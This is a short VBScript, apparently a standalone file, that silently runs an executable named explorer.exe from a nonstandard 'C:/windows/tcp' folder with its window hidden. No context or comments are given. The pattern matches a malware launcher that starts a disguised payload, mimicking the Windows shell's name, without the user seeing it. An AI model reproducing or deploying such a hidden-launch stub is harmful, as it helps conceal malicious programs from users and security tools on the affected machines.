Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:/windows/tcp/explorer.exe" & Chr(34), 0
Set WshShell = Nothing